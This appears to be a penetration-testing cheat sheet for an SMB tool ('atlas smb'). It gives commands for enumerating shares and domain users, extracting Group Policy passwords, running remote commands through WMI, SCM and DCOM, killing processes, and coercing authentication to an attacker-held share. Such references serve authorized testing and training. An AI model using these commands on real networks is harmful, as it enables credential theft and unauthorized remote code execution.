# SMB Protocol

## Enumeration

The following assume a Kali host on 192.168.1.0/24.

### Enumerate Shares and Access
```bash
atlas smb 192.168.1.5 -u admin -p 'Password1!' --shares
atlas smb 192.168.1.5 -M shareaccess
```

### Enumerate Domain Users / Groups
```bash
atlas smb 192.168.1.5 -u admin -p pass --users
atlas smb 192.168.1.5 -u admin -p pass --groups
atlas smb 192.168.1.5 -u admin -p pass --rid-brute 4000
```

### GPP
```bash
atlas smb 192.168.1.5 -u admin -p pass -M gpp_password
atlas smb 192.168.1.5 -u admin -p pass -M gpp_autologin
```

### Generate Hosts/Krb5
```bash
atlas smb 192.168.1.5 -u admin -p pass --generate-hosts-file hosts.txt --generate-krb5-file krb5.conf
```

### Extended Enumeration (Titanis RPC/SMB2)
```bash
atlas smb 192.168.1.5 -u admin -p pass --snapshots 'C$' --streams 'C$\file' --open-files --nics
atlas smb 192.168.1.5 -u admin -p pass --group-members 'Domain Admins'
atlas smb 192.168.1.5 -u admin -p pass --lookup-sid S-1-5-32-544 --lookup-name admin
atlas smb 192.168.1.5 -u admin -p pass --reg-query 'HKLM\SOFTWARE\Microsoft' --services
atlas smb 192.168.1.5 -u admin -p pass --loggedon-users --tasklist lsass --taskkill 1234
atlas smb 192.168.1.5 -u admin -p pass --coerce '\\ATTACKER\share'
```

### Execution Methods
```bash
atlas smb 192.168.1.5 -u admin -p pass -x whoami --exec-method wmiexec   # WMI (default)
atlas smb 192.168.1.5 -u admin -p pass -x whoami --exec-method smbexec   # SCM service
atlas smb 192.168.1.5 -u admin -p pass -x whoami --exec-method mmcexec   # MMC20 DCOM
```

### New Modules
`ntlmv1`, `reg-winlogon`, `hyperv-host`, `remote-uac`, `rdp`, `shadowrdp`, `reg-query`,
`enum_cve`, `enum_av`, `enum_dns`, `get_netconnections`, `bitlocker`, `putty`, `notepad`,
`recent_files`, `recyclebin`, `snipped`, `lockscreendoors`, `drop-sc`, `drop-library-ms`,
`scuffy`, `slinky`, `webdav`, `smbghost`, `onelogon`, `sccm-recon6`, `wcc`, `change-password`.
```bash
atlas smb 192.168.1.5 -u admin -p pass -M wcc,enum_cve,enum_av
atlas smb 192.168.1.5 -u admin -p pass -M reg-query -o PATH=HKLM\SOFTWARE\X,KEY=Name
```

See also: LDAP, Kerberos, WMI, DCSync.
